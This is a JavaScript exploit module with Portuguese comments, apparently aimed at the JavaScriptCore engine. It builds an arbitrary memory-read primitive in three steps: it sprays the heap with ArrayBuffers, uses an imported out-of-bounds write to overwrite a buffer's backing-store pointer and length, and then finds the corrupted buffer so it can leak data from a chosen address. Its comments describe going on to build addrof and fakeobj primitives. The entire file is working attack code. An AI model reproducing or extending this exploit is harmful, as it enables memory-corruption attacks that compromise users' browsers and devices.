// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA CONSTRUIR LEITURA ARBITRÁRIA)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { toHex, sleep } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Exploit de Leitura Arbitrária ---
const ARBITRARY_READ_CONFIG = {
    // Vamos "pulverizar" a memória com muitos ArrayBuffers para aumentar
    // a chance de um deles estar em um local previsível.
    SPRAY_COUNT: 200,
    BUFFER_SIZE: 256,

    // Endereço que vamos tentar ler. Idealmente, este seria o endereço de um objeto
    // que queremos inspecionar, ou um endereço GOT/vtable para vazar um ponteiro de biblioteca.
    // Como ainda não temos um 'addrof', vamos usar um endereço conhecido do disassembly.
    // Ex: 0x00000000003BD820 (de JSC::ProtoCallFrame::argument)
    TARGET_READ_ADDRESS: 0x3BD820n,

    // Offsets para corromper os metadados do ArrayBuffer. Estes valores são
    // específicos do motor e precisam ser ajustados.
    OFFSET_TO_BYTE_LENGTH: 8,
    OFFSET_TO_BACKING_STORE: 16,

    // O script tentará corromper a memória em vários offsets relativos ao nosso
    // buffer OOB, na esperança de atingir um dos buffers pulverizados.
    corruption_offsets: [
        (128) - 16, 
        (128) - 8,
        (128),
        (128) + 8,
        (128) + 16,
    ],
};
// --- Fim dos Parâmetros ---

// Função auxiliar para ler um valor de 64 bits (BigInt) a partir de um buffer
function readBigInt64(dataview, offset) {
    const low = dataview.getUint32(offset, true);
    const high = dataview.getUint32(offset + 4, true);
    return (BigInt(high) << 32n) | BigInt(low);
}

export async function testArbitraryRead() {
    const FNAME = "testArbitraryRead";
    logS3(`--- Iniciando Tentativa de Leitura de Memória Arbitrária ---`, "test", FNAME);
    logS3(`   Alvo da Leitura: ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}`, "info", FNAME);

    let success = false;

    // A cada tentativa, reconfiguramos o ambiente para isolar os efeitos.
    for (const offset of ARBITRARY_READ_CONFIG.corruption_offsets) {
        if (success) break;

        await triggerOOB_primitive();
        if (!oob_write_absolute) {
            logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
            return;
        }

        logS3(`\n>>> Nova Tentativa: Corrompendo offset relativo ${toHex(offset)}`, "info", FNAME);

        // Etapa 1: Pulverizar o heap com ArrayBuffers para criar um layout previsível.
        let sprayed_buffers = [];
        for (let i = 0; i < ARBITRARY_READ_CONFIG.SPRAY_COUNT; i++) {
            let ab = new ArrayBuffer(ARBITRARY_READ_CONFIG.BUFFER_SIZE);
            // Preencher com um valor conhecido para identificar se a leitura foi alterada.
            new Uint32Array(ab)[0] = 0xDEADBEEF;
            sprayed_buffers.push(ab);
        }
        logS3(`${ARBITRARY_READ_CONFIG.SPRAY_COUNT} buffers pulverizados no heap.`, "info", FNAME);

        try {
            // Etapa 2: Usar a primitiva OOB para corromper um buffer que *esperamos* estar no offset.
            // Vamos sobrescrever seu ponteiro de dados e seu tamanho.
            
            // Corrompe o ponteiro para o endereço que queremos ler
            logS3(`  1. Escrevendo ponteiro para ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE, ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS, 8);

            // Corrompe o tamanho para um valor grande
            logS3(`  2. Escrevendo tamanho 0xFFFFFFFF em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH}`, "warn", FNAME);
            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH, 0xFFFFFFFF, 4);

            await sleep(50); // Pausa curta

            // Etapa 3: Verificar todos os buffers pulverizados para encontrar o que foi corrompido.
            for (let i = 0; i < sprayed_buffers.length; i++) {
                const ab = sprayed_buffers[i];
                // Se o tamanho foi corrompido, será diferente do original.
                if (ab.byteLength > ARBITRARY_READ_CONFIG.BUFFER_SIZE) {
                    logS3(`--- SUCESSO: Buffer [${i}] foi corrompido! ---`, "vuln", FNAME);
                    logS3(`   Tamanho original: ${ARBITRARY_READ_CONFIG.BUFFER_SIZE}, Tamanho corrompido: ${ab.byteLength}`, "info", FNAME);
                    
                    // Agora usamos este buffer para ler o endereço alvo.
                    let memory_reader_view = new DataView(ab);
                    const leaked_data = readBigInt64(memory_reader_view, 0);

                    logS3(`   >> DADO VAZADO de ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}: ${toHex(leaked_data)}`, "leak", FNAME);

                    // A partir daqui, você teria uma primitiva de leitura arbitrária.
                    // Poderíamos usá-la para construir 'addrof' e 'fakeobj'.
                    success = true;
                    break; 
                }
            }

        } catch (e) {
            logS3(`Erro durante a tentativa com offset ${toHex(offset)}: ${e.message}`, "error", FNAME);
        }
        
        // Limpa a memória para a próxima tentativa
        sprayed_buffers = null;
        globalThis.gc?.(); // Sugere ao motor para fazer a coleta de lixo, se disponível/exposto.
        await sleep(50);
    }

    clearOOBEnvironment();
    if (success) {
        logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
    } else {
        logS3("--- Teste concluído, não foi possível encontrar um offset vulnerável. ---", "warn", FNAME);
    }
}
